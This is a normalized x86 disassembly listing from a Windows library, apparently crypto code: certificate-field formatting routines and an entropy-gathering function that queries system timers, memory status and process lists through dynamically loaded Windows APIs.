jmp [ ecx * 4 + jump_table_10050f88 ]
lea eax [ esp + 0x118 ]
push eax
push r--data
push r--data
call sub_10055f50
mov eax [ esp + 0x124 ]
add esp 0xc
pop ebx
add esp 0x108
retn
lea ecx [ esp + 0x118 ]
push ecx
push r--data
push r--data
call sub_10055f50
mov eax [ esp + 0x124 ]
add esp 0xc
pop ebx
add esp 0x108
retn
lea edx [ esp + 0x118 ]
push edx
push r--data
push r--data
call sub_10055f50
mov eax [ esp + 0x124 ]
add esp 0xc
pop ebx
add esp 0x108
retn
mov edx [ eax + 0x4 ]
lea ecx [ esp + 0x118 ]
push ecx
mov eax [ edx + 0x8 ]
push eax
push r--data
call sub_10055f50
mov eax [ esp + 0x124 ]
add esp 0xc
pop ebx
add esp 0x108
retn
mov edx [ eax + 0x4 ]
lea ecx [ esp + 0x118 ]
push ecx
mov eax [ edx + 0x8 ]
push eax
push r--data
call sub_10055f50
mov eax [ esp + 0x124 ]
add esp 0xc
pop ebx
add esp 0x108
retn
mov edx [ eax + 0x4 ]
lea ecx [ esp + 0x118 ]
push ecx
mov eax [ edx + 0x8 ]
push eax
push r--data
call sub_10055f50
mov eax [ esp + 0x124 ]
add esp 0xc
pop ebx
add esp 0x108
retn
mov edx [ eax + 0x4 ]
lea ecx [ esp + 0xc ]
push 0x100
push ecx
push edx
call sub_10034190
lea eax [ esp + 0x124 ]
lea ecx [ esp + 0x18 ]
push eax
push ecx
push r--data
call sub_10055f50
mov eax [ esp + 0x130 ]
add esp 0x18
pop ebx
add esp 0x108
retn
mov eax [ eax + 0x4 ]
mov ebx [ eax + 0x8 ]
mov eax [ eax ]
cmp eax 0x4
jne r-xdata
mov eax [ eax + 0x4 ]
lea ecx [ esp + 0xc ]
push eax
push 0x100
push ecx
call sub_10030590
lea edx [ esp + 0x124 ]
lea eax [ esp + 0x18 ]
push edx
push eax
push r--data
call sub_10055f50
add esp 0x18
cmp eax 0x10
jne r-xdata
xor edx edx
xor eax eax
mov dl [ ebx + 0x3 ]
mov al [ ebx + 0x2 ]
push edx
xor ecx ecx
mov cl [ ebx + 0x1 ]
xor edx edx
mov dl [ ebx ]
push eax
push ecx
push edx
push r--data
lea eax [ esp + 0x20 ]
push 0x100
push eax
call sub_100279b0
add esp 0x1c
jmp r-xdata
lea edx [ esp + 0x118 ]
push edx
push r--data
push r--data
call sub_10055f50
mov eax [ esp + 0x124 ]
add esp 0xc
pop ebx
add esp 0x108
retn
push ebp
push esi
push edi
mov [ esp + 0x18 ] 0x0
xor ebp ebp
lea eax [ esp + 0x118 ]
lea ecx [ esp + 0xc ]
push eax
push ecx
push r--data
call sub_10055f50
mov eax [ esp + 0x124 ]
add esp 0xc
pop ebx
add esp 0x108
retn
inc ebp
cmp ebp 0x8
jl r-xdata
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x18 ]
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
xor ecx ecx
lea edx [ esp + 0x10 ]
mov ch [ ebx ]
mov cl [ ebx + 0x1 ]
push ecx
push r--data
push 0x5
push edx
call sub_100279b0
lea edi [ esp + 0x20 ]
or ecx 0xffffffff
xor eax eax
add esp 0x10
add ebx 0x2
lea edx [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
cmp ebp 0x7
[ edi ] [ esi ]
je r-xdata
pop edi
pop esi
pop ebp
sub_10050fb0
push esi
mov esi [ esp + 0xc ]
push edi
mov eax [ esi ]
cmp eax 0x8
ja r-xdata
pop edi
mov eax 0x1
pop esi
retn
jmp [ eax * 4 + jump_table_10051170 ]
mov eax [ esp + 0xc ]
push r--data
push eax
call sub_10026b40
add esp 0x8
mov eax 0x1
pop edi
pop esi
retn
mov ecx [ esp + 0xc ]
push r--data
push ecx
call sub_10026b40
add esp 0x8
mov eax 0x1
pop edi
pop esi
retn
mov edx [ esp + 0xc ]
push r--data
push edx
call sub_10026b40
add esp 0x8
mov eax 0x1
pop edi
pop esi
retn
mov eax [ esi + 0x4 ]
mov edx [ esp + 0xc ]
mov ecx [ eax + 0x8 ]
push ecx
push r--data
push edx
call sub_10026b40
add esp 0xc
mov eax 0x1
pop edi
pop esi
retn
mov eax [ esi + 0x4 ]
mov edx [ esp + 0xc ]
mov ecx [ eax + 0x8 ]
push ecx
push r--data
push edx
call sub_10026b40
add esp 0xc
mov eax 0x1
pop edi
pop esi
retn
mov eax [ esi + 0x4 ]
mov edx [ esp + 0xc ]
mov ecx [ eax + 0x8 ]
push ecx
push r--data
push edx
call sub_10026b40
add esp 0xc
mov eax 0x1
pop edi
pop esi
retn
mov edi [ esp + 0xc ]
push r--data
push edi
call sub_10026b40
mov eax [ esi + 0x4 ]
push 0x82031f
push 0x0
push eax
push edi
call sub_1005c970
add esp 0x18
mov eax 0x1
pop edi
pop esi
retn
mov eax [ esi + 0x4 ]
mov esi [ eax + 0x8 ]
mov eax [ eax ]
cmp eax 0x4
jne r-xdata
mov edi [ esp + 0xc ]
push r--data
push edi
call sub_10026b40
mov edx [ esi + 0x4 ]
push edx
push edi
call sub_100305b0
add esp 0x10
cmp eax 0x10
jne r-xdata
xor ecx ecx
xor edx edx
mov cl [ esi + 0x3 ]
mov dl [ esi + 0x2 ]
push ecx
xor eax eax
mov al [ esi + 0x1 ]
xor ecx ecx
mov cl [ esi ]
push edx
mov edx [ esp + 0x14 ]
push eax
push ecx
push r--data
push edx
call sub_10026b40
add esp 0x18
mov eax 0x1
pop edi
pop esi
retn
mov ecx [ esp + 0xc ]
push r--data
push ecx
call sub_10026b40
add esp 0x8
mov eax 0x1
pop edi
pop esi
retn
mov edi [ esp + 0xc ]
push ebx
push r--data
push edi
call sub_10026b40
add esp 0x8
mov ebx 0x8
xor eax eax
mov ah [ esi ]
mov al [ esi + 0x1 ]
push eax
push r--data
push edi
call sub_10026b40
add esp 0xc
add esi 0x2
dec ebx
jne r-xdata
push r--data
push edi
call sub_10020a80
add esp 0x8
mov eax 0x1
pop ebx
pop edi
pop esi
retn
sub_100511a0
mov eax 0x4
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
call sub_1001e3c0
mov ebx eax
test ebx ebx
jne r-xdata
mov edi [ esp + 0x20 ]
xor esi esi
push edi
mov [ esp + 0x14 ] esi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
push 0xf4
push r--data
push 0x41
push 0x99
push 0x22
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
pop ecx
retn
mov ebp [ esp + 0x1c ]
mov ecx [ esp + 0x18 ]
push 0x0
push edi
push ebp
push ecx
push 0x0
call sub_10051650
add esp 0x14
test eax eax
je r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
push sub_100340f0
push ebx
call sub_1001e730
add esp 0x8
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push eax
push ebx
call sub_1001e6c0
add esp 0x8
mov esi r--data
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
push esi
push edi
call sub_1001e7c0
mov edi eax
push r--data
mov eax [ edi + 0x4 ]
push eax
call sub_100570e0
add esp 0x10
test eax eax
jne r-xdata
test ebp ebp
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
push 0x113
push r--data
push 0x7f
cmp [ ebp ] 0x1
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov esi [ esp + 0x10 ]
mov edi [ esp + 0x20 ]
inc esi
push edi
mov [ esp + 0x14 ] esi
call sub_1001e7b0
add esp 0x4
cmp esi eax
jge r-xdata
mov eax [ ebp + 0x4 ]
test eax eax
je r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
push 0xffffffff
push 0x55
push eax
call sub_10036790
add esp 0xc
test eax eax
jl r-xdata
push eax
mov eax [ ebp + 0x4 ]
push eax
call sub_100367b0
add esp 0x8
test eax eax
je r-xdata
push 0x11a
push r--data
push 0x7e
jmp r-xdata
push eax
call sub_10055cb0
mov esi eax
add esp 0x4
test esi esi
je r-xdata
push 0x7b
push 0x22
call sub_1001de60
add esp 0x14
push esi
xor edi edi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
push esi
call sub_1001e780
add esp 0x4
jmp r-xdata
push edi
push esi
call sub_1001e7c0
push eax
push ebx
call sub_1001e6c0
add esp 0x10
test eax eax
je r-xdata
push 0x121
push r--data
push 0x41
jmp r-xdata
push esi
inc edi
call sub_1001e7b0
add esp 0x4
cmp edi eax
jl r-xdata
sub_10051390
mov eax 0x4
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
call sub_1001e3c0
mov ebx eax
test ebx ebx
jne r-xdata
mov edi [ esp + 0x20 ]
xor esi esi
push edi
mov [ esp + 0x14 ] esi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
push 0x135
push r--data
push 0x41
push 0x9a
push 0x22
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
pop ecx
retn
mov ebp [ esp + 0x1c ]
mov eax [ edi + 0x4 ]
push r--data
push eax
call sub_100570e0
add esp 0x8
test eax eax
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
push 0x0
push edi
push ebp
push eax
push 0x0
call sub_10051650
add esp 0x14
test eax eax
je r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov esi r--data
push sub_100340f0
push ebx
call sub_1001e730
add esp 0x8
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push eax
push ebx
call sub_1001e6c0
add esp 0x8
mov esi r--data
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
push esi
push edi
call sub_1001e7c0
mov edi eax
push r--data
mov eax [ edi + 0x4 ]
push eax
call sub_100570e0
add esp 0x10
test eax eax
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
push eax
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
push 0x1
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
jmp r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
push ebx
push ebp
call sub_10051510
add esp 0xc
test eax eax
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov esi [ esp + 0x10 ]
mov edi [ esp + 0x20 ]
inc esi
push edi
mov [ esp + 0x14 ] esi
call sub_1001e7b0
add esp 0x4
cmp esi eax
jl r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sub_10051510
mov eax [ esp + 0x4 ]
push ebx
push ebp
push esi
push edi
xor ebx ebx
xor edi edi
test eax eax
je r-xdata
push 0x15b
push r--data
push 0x7d
cmp [ eax ] 0x1
jne r-xdata
mov ecx [ eax + 0x8 ]
test ecx ecx
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
push ecx
call sub_10021340
add esp 0x4
mov ebp eax
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
je r-xdata
push 0xffffffff
push 0x30
push ebp
call sub_1005d420
mov esi eax
add esp 0xc
test esi esi
jl r-xdata
test ecx ecx
je r-xdata
push esi
push ebp
call sub_1005d490
push eax
call sub_1005d810
push eax
call sub_1002ebe0
mov ebx eax
mov eax [ esp + 0x2c ]
add esp 0x10
test eax eax
je r-xdata
mov eax [ eax + 0xc ]
mov ecx [ eax ]
mov ebp [ ecx + 0x10 ]
test ebx ebx
je r-xdata
push esi
push ebp
call sub_1005d4d0
add esp 0x8
dec esi
push 0x16e
push r--data
push 0x41
jmp r-xdata
call sub_100340e0
mov edi eax
test edi edi
je r-xdata
push 0x7a
push 0x22
call sub_1001de60
add esp 0x14
push edi
call sub_100340f0
push ebx
call sub_1002ee10
add esp 0x8
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
mov edx [ esp + 0x18 ]
push edi
mov [ edi + 0x4 ] ebx
push edx
xor ebx ebx
mov [ edi ] 0x1
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
push 0x175
push r--data
push 0x41
jmp r-xdata
push esi
push 0x30
push ebp
xor edi edi
call sub_1005d420
mov esi eax
add esp 0xc
test esi esi
jge r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
sub_10051650
mov eax [ esp + 0x10 ]
push ebx
push ebp
push esi
mov ebx [ eax + 0x8 ]
push edi
mov edi [ eax + 0x4 ]
test ebx ebx
jne r-xdata
mov ebp [ esp + 0x14 ]
test ebp ebp
jne r-xdata
push 0x1b0
push r--data
push 0x7c
push 0x75
push 0x22
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
push r--data
push edi
call sub_100570e0
add esp 0x8
test eax eax
jne r-xdata
call sub_100340e0
mov ebp eax
test ebp ebp
jne r-xdata
push r--data
push edi
call sub_100570e0
add esp 0x8
test eax eax
jne r-xdata
mov esi 0x1
push 0x1bb
push r--data
push 0x41
push 0x75
push 0x22
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
push r--data
push edi
call sub_100570e0
add esp 0x8
test eax eax
jne r-xdata
mov esi 0x6
jmp r-xdata
push 0x208
push r--data
push 0x41
push 0x75
push 0x22
call sub_1001de60
add esp 0x14
jmp r-xdata
mov edi ebx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push ebx
push edx
call sub_1002ec90
add esp 0xc
test eax eax
jne r-xdata
push r--data
push edi
call sub_100570e0
add esp 0x8
test eax eax
jne r-xdata
mov esi 0x2
jmp r-xdata
push 0x16
call sub_1002edc0
mov edx eax
add esp 0x4
test edx edx
mov [ ebp + 0x4 ] edx
je r-xdata
mov eax [ esp + 0x14 ]
test eax eax
jne r-xdata
mov [ ebp ] esi
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn
push r--data
push edi
call sub_100570e0
add esp 0x8
test eax eax
jne r-xdata
push eax
push ebx
call sub_10022b70
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
push ebp
call sub_100340f0
add esp 0x4
push r--data
push edi
call sub_100570e0
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esp + 0x24 ]
push ebx
test eax eax
je r-xdata
mov [ ebp + 0x4 ] eax
mov esi 0x8
push 0x1d4
push r--data
push 0x77
push 0x75
push 0x22
call sub_1001de60
push ebx
push r--data
jmp r-xdata
push r--data
push edi
call sub_100570e0
add esp 0x8
test eax eax
jne r-xdata
mov esi 0x4
call sub_10020200
mov edi eax
test edi edi
je r-xdata
call sub_10057120
call sub_10057330
jmp r-xdata
push 0x2
call sub_1001e1a0
add esp 0x20
push 0x1fd
push r--data
push 0x75
push 0x75
push 0x22
call sub_1001de60
push edi
push r--data
push 0x3b
push ebx
call strchr
mov esi eax
add esp 0x8
test esi esi
je r-xdata
push 0x1ee
push r--data
push 0x95
push 0x75
push 0x22
call sub_1001de60
add esp 0x14
jmp r-xdata
mov eax [ esp + 0x1c ]
push ebx
push eax
call sub_1005e650
add esp 0x8
test eax eax
jne r-xdata
mov esi 0x7
pop edi
mov [ ebp ] esi
mov eax ebp
pop esi
pop ebp
pop ebx
retn
push 0x1e3
push r--data
push 0x76
push 0x75
push 0x22
call sub_1001de60
push ebx
push r--data
jmp r-xdata
add esp 0x4
mov [ ebp + 0x4 ] eax
test eax eax
jne r-xdata
push 0x1f6
push r--data
push 0x93
push 0x75
push 0x22
call sub_1001de60
add esp 0x14
jmp r-xdata
call sub_100340b0
test eax eax
mov [ ebp + 0x4 ] eax
je r-xdata
push 0x1001
push eax
push edi
call sub_10057900
mov ebx eax
add esp 0xc
test ebx ebx
jne r-xdata
push 0x23a
push r--data
push 0x96
push 0x90
push 0x22
call sub_1001de60
push ebx
push r--data
push 0x2
call sub_1001e1a0
push edi
call sub_10020210
add esp 0x24
jmp r-xdata
mov ecx [ eax + 0x4 ]
push ecx
call sub_1002f080
mov edx [ esp + 0x20 ]
lea eax [ esi + 0x1 ]
push edx
push eax
call sub_1005d820
mov ecx [ ebp + 0x4 ]
add esp 0xc
mov [ ecx + 0x4 ] eax
mov edx [ ebp + 0x4 ]
mov eax [ edx + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
mov [ ebp + 0x4 ] edi
jne r-xdata
push edi
call sub_10020210
add esp 0x4
sub esi ebx
push 0x226
mov edi esi
push r--data
lea eax [ edi + 0x1 ]
push eax
call sub_1001d4c0
mov esi eax
push edi
push ebx
push esi
call strncpy
push 0x0
push esi
mov [ edi + esi ] 0x0
call sub_10022b70
mov ecx [ ebp + 0x4 ]
push esi
mov [ ecx ] eax
call sub_1001d740
mov edx [ ebp + 0x4 ]
add esp 0x24
cmp [ edx ] 0x0
jne r-xdata
xor esi esi
pop edi
mov [ ebp ] esi
mov eax ebp
pop esi
pop ebp
pop ebx
retn
sub_100519c0
push esi
push edi
mov edi [ esp + 0x10 ]
test edi edi
je r-xdata
call sub_10023850
mov esi eax
test esi esi
jne r-xdata
mov esi [ edi ]
test esi esi
jne r-xdata
mov eax [ esp + 0xc ]
push eax
mov [ esi + 0x4 ] eax
call sub_100238a0
add esp 0x4
cmp eax 0x6
mov [ esi ] eax
je r-xdata
push 0x54
push r--data
push 0x6
push 0x9b
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
retn
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
push eax
push ecx
push 0x0
call sub_1002b4c0
add esp 0xc
mov [ esi + 0xc ] eax
test eax eax
jne r-xdata
cmp eax 0x74
je r-xdata
test edi edi
je r-xdata
push 0x63
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
push eax
lea edx [ esi + 0xc ]
push ecx
push edx
call sub_1002e500
add esp 0xc
test eax eax
jne r-xdata
cmp eax 0x198
je r-xdata
mov eax esi
pop edi
pop esi
retn
mov [ edi ] esi
pop edi
xor eax eax
pop esi
retn
test edi edi
je r-xdata
push 0x6d
jmp r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
push eax
lea edx [ esi + 0xc ]
push ecx
push edx
call sub_100500a0
add esp 0xc
test eax eax
jne r-xdata
push 0x7d
push r--data
push 0xa3
jmp r-xdata
push esi
call sub_10023940
add esp 0x4
cmp [ edi ] esi
je r-xdata
push r--data
push 0xd
push 0x77
jmp r-xdata
push 0x9b
push 0xd
call sub_1001de60
add esp 0x14
test esi esi
je r-xdata
sub_10051ac0
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax 0x4d0
call sub_1001d0d0
push ebx
push ebp
push esi
lea eax [ esp + 0xfc ]
push edi
xor esi esi
push eax
mov [ esp + 0x24 ] esi
mov [ esp + 0x20 ] esi
mov [ esp + 0x104 ] 0x94
call [ GetVersionExA@IAT ]
mov ebx [ LoadLibraryA@IAT ]
push r--data
call ebx
mov ebp eax
push r--data
mov [ esp + 0x1c ] ebp
call ebx
push r--data
mov edi eax
call ebx
mov ebx eax
cmp ebx esi
mov esi [ GetProcAddress@IAT ]
je r-xdata
test ebp ebp
je r-xdata
push r--data
push ebx
call esi
push r--data
push ebx
mov ebp eax
call esi
test ebp ebp
mov [ esp + 0x14 ] eax
je r-xdata
cmp [ esp + 0x110 ] 0x2
jne r-xdata
push r--data
push ebp
call esi
push r--data
push ebp
mov ebx eax
call esi
push r--data
push ebp
mov [ esp + 0x18 ] eax
call esi
test ebx ebx
mov [ esp + 0x14 ] eax
je r-xdata
push ebx
call [ FreeLibrary@IAT ]
mov ebp [ esp + 0x18 ]
test eax eax
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
call sub_1001f6a0
test eax eax
jne r-xdata
push ebp
call [ FreeLibrary@IAT ]
mov ecx [ esp + 0x10 ]
test ecx ecx
je r-xdata
lea ecx [ esp + 0x10 ]
push ecx
push 0x0
push 0x0
push r--data
push 0x0
call ebp
test eax eax
jne r-xdata
test edi edi
je r-xdata
push r--data
push ebx
call esi
push r--data
push ebx
mov ebp eax
call esi
push r--data
push ebx
mov [ esp + 0x2c ] eax
call esi
test ebp ebp
mov [ esp + 0x28 ] eax
je r-xdata
test eax eax
je r-xdata
lea ecx [ esp + 0x10 ]
push ecx
push 0x0
push 0x0
push r--data
push 0x0
call ebp
test eax eax
jne r-xdata
mov edx [ esp + 0x10 ]
push 0x40468000
push eax
push 0xd8
push edx
call sub_10021890
mov eax [ esp + 0x20 ]
add esp 0x10
push eax
call [ esp + 0x18 ]
mov ebx [ GetTickCount@IAT ]
push r--data
push edi
xor ebp ebp
call esi
push r--data
push edi
mov ebx eax
call esi
push r--data
push edi
mov [ esp + 0x34 ] eax
call esi
push r--data
push edi
mov [ esp + 0x18 ] eax
call esi
push r--data
push edi
mov [ esp + 0x40 ] eax
call esi
push r--data
push edi
mov [ esp + 0x1c ] eax
call esi
push r--data
push edi
mov [ esp + 0x48 ] eax
call esi
push r--data
push edi
mov [ esp + 0x44 ] eax
call esi
push r--data
push edi
mov [ esp + 0x3c ] eax
call esi
push r--data
push edi
mov [ esp + 0x30 ] eax
call esi
push r--data
push edi
mov [ esp + 0x2c ] eax
call esi
push r--data
push edi
mov [ esp + 0x20 ] eax
call esi
test ebx ebx
mov [ esp + 0x58 ] eax
je r-xdata
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
call ebp
push 0x0
push 0x0
lea edx [ esp + 0x20 ]
push 0x4
push edx
mov [ esp + 0x28 ] eax
call sub_10021890
add esp 0x10
push 0xf0000000
push 0x1
push 0x0
lea ecx [ esp + 0x2c ]
push 0x0
push ecx
call ebx
test eax eax
je r-xdata
mov edx [ esp + 0x10 ]
push 0x40310000
push eax
push 0x44
push edx
call sub_10021890
mov eax [ esp + 0x20 ]
add esp 0x10
push eax
call [ esp + 0x18 ]
call ebx
push 0x0
push 0x0
lea edx [ esp + 0x34 ]
push 0x4
push edx
mov [ esp + 0x3c ] eax
call sub_10021890
add esp 0x10
lea eax [ esp + 0x58 ]
push eax
call [ QueryPerformanceCounter@IAT ]
test eax eax
jne r-xdata
mov ebx [ GetTickCount@IAT ]
push edi
call [ FreeLibrary@IAT ]
jmp r-xdata
mov ecx [ esp + 0x10 ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
cmp [ esp + 0x110 ] 0x2
jne r-xdata
push 0x0
push 0x16
push r--data
lea eax [ esp + 0x2c ]
push 0x0
push eax
call ebx
test eax eax
je r-xdata
mov eax [ esp + 0x20 ]
lea edx [ esp + 0xc0 ]
push edx
push 0x40
push eax
call [ esp + 0x1c ]
test eax eax
je r-xdata
push 0x0
push 0x0
lea ecx [ esp + 0x60 ]
push 0x8
push ecx
call sub_10021890
mov eax [ rw-data ]
add esp 0x10
test eax eax
jne r-xdata
mov [ rw-data ] eax
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ esp + 0x38 ]
test ecx ecx
je r-xdata
push ebx
call [ FreeLibrary@IAT ]
push 0xbf
call eax
push 0x3ff00000
push 0x0
lea ecx [ esp + 0x38 ]
push 0x4
push ecx
mov [ esp + 0x40 ] eax
call sub_10021890
add esp 0x10
lea ecx [ esp + 0x44 ]
mov [ esp + 0x44 ] 0x14
push ecx
call eax
test eax eax
je r-xdata
cmp [ esp + 0x104 ] 0x5
jb r-xdata
mov edx [ esp + 0x20 ]
lea ecx [ esp + 0xc0 ]
push ecx
push 0x40
push edx
call [ esp + 0x1c ]
test eax eax
je r-xdata
mov edx [ esp + 0x20 ]
push 0x0
push edx
call [ esp + 0x1c ]
push 0x0
push 0x0
lea ecx [ esp + 0xc8 ]
push 0x40
push ecx
call sub_10021890
add esp 0x10
mov [ esp + 0x1c ] 0x1
lea eax [ esp + 0xa0 ]
push eax
call [ GlobalMemoryStatus@IAT ]
push 0x3ff00000
push 0x0
lea ecx [ esp + 0xa8 ]
push 0x20
push ecx
call sub_10021890
add esp 0x10
call [ GetCurrentProcessId@IAT ]
push 0x3ff00000
push 0x0
lea edx [ esp + 0x38 ]
push 0x4
push edx
mov [ esp + 0x40 ] eax
call sub_10021890
add esp 0x10
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ esp + 0x14 ]
test ecx ecx
je r-xdata
mov edx [ esp + 0x44 ]
push 0x40000000
push 0x0
lea eax [ esp + 0x4c ]
push edx
push eax
call sub_10021890
add esp 0x10
mov ecx [ esp + 0x20 ]
push 0x0
push ecx
call [ esp + 0x1c ]
push 0x40500000
push 0x0
lea eax [ esp + 0xc8 ]
push 0x40
push eax
call sub_10021890
add esp 0x10
mov [ esp + 0x1c ] 0x1
mov ecx [ esp + 0x40 ]
test ecx ecx
je r-xdata
mov ecx [ esp + 0x3c ]
test ecx ecx
je r-xdata
mov ecx [ esp + 0x34 ]
test ecx ecx
je r-xdata
mov ecx [ esp + 0x28 ]
test ecx ecx
je r-xdata
mov ecx [ esp + 0x24 ]
test ecx ecx
je r-xdata
mov ecx [ esp + 0x18 ]
test ecx ecx
je r-xdata
test eax eax
je r-xdata
push ebp
push 0xf
call ebx
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax [ esp + 0x1c ]
mov ebx [ GetTickCount@IAT ]
test eax eax
mov [ esp + 0x44 ] 0x10
je r-xdata
lea edx [ esp + 0x44 ]
push edx
push esi
call [ esp + 0x1c ]
test eax eax
je r-xdata
call ebx
mov ebp eax
add ebp 0x3e8
mov eax [ esp + 0x1c ]
mov [ esp + 0x194 ] 0x128
test eax eax
je r-xdata
mov eax [ esp + 0x44 ]
push 0x40080000
push 0x0
lea ecx [ esp + 0x4c ]
push eax
push ecx
call sub_10021890
mov edx [ esp + 0x5c ]
mov eax [ esp + 0x58 ]
add esp 0x10
lea ecx [ esp + 0x7c ]
mov [ esp + 0x7c ] 0x24
push edx
push eax
push ecx
call [ esp + 0x1c ]
test eax eax
je r-xdata
lea eax [ esp + 0x194 ]
push eax
push esi
call [ esp + 0x44 ]
test eax eax
je r-xdata
call ebx
mov ebp eax
add ebp 0x3e8
lea edx [ esp + 0x44 ]
push edx
push esi
call [ esp + 0x48 ]
test eax eax
je r-xdata
mov ebx 0x50
mov eax [ esp + 0x1c ]
mov [ esp + 0x60 ] 0x1c
test eax eax
je r-xdata
mov ecx [ esp + 0x194 ]
push 0x40220000
push 0x0
lea edx [ esp + 0x19c ]
push ecx
push edx
call sub_10021890
add esp 0x10
lea eax [ esp + 0x194 ]
push eax
push esi
call [ esp + 0x3c ]
test eax eax
je r-xdata
call ebx
cmp eax ebp
jb r-xdata
mov ebx [ GetTickCount@IAT ]
dec ebx
test ebx ebx
jg r-xdata
lea ecx [ esp + 0x60 ]
push ecx
push esi
call [ esp + 0x30 ]
test eax eax
je r-xdata
call ebx
mov ebp eax
add ebp 0x3e8
call ebx
cmp eax ebp
jb r-xdata
mov edx [ esp + 0x7c ]
push 0x40140000
push 0x0
lea eax [ esp + 0x84 ]
push edx
push eax
call sub_10021890
add esp 0x10
lea ecx [ esp + 0x7c ]
push ecx
call [ esp + 0x3c ]
test eax eax
je r-xdata
mov eax [ esp + 0x1c ]
mov [ esp + 0x2bc ] 0x224
test eax eax
je r-xdata
mov edx [ esp + 0x60 ]
push 0x40180000
push 0x0
lea eax [ esp + 0x68 ]
push edx
push eax
call sub_10021890
add esp 0x10
lea ecx [ esp + 0x60 ]
push ecx
push esi
call [ esp + 0x2c ]
test eax eax
je r-xdata
lea edx [ esp + 0x2bc ]
push edx
push esi
call [ esp + 0x20 ]
test eax eax
je r-xdata
call ebx
mov ebp eax
add ebp 0x3e8
call ebx
cmp eax ebp
jb r-xdata
mov eax [ esp + 0x2c ]
push esi
test eax eax
je r-xdata
mov eax [ esp + 0x2bc ]
push 0x40220000
push 0x0
lea ecx [ esp + 0x2c4 ]
push eax
push ecx
call sub_10021890
add esp 0x10
lea edx [ esp + 0x2bc ]
push edx
push esi
call [ esp + 0x60 ]
test eax eax
je r-xdata
call [ CloseHandle@IAT ]
push edi
call [ FreeLibrary@IAT ]
jmp r-xdata
call eax
push edi
call [ FreeLibrary@IAT ]
jmp r-xdata
call ebx
cmp eax ebp
jb r-xdata
sub_10052180
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x4 ]
push eax
call sub_10030910
mov al [ esi ]
add esp 0x4
test al 0x4
jne r-xdata
mov edx [ esi + 0xc ]
push sub_10030910
push edx
call sub_1001e730
push esi
call sub_1001d740
add esp 0xc
pop esi
retn
mov ecx [ esi + 0x8 ]
push sub_10052780
push ecx
call sub_1001e730
add esp 0x8
sub_100521d0
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
mov edi [ esp + 0x14 ]
test ebx ebx
jne r-xdata
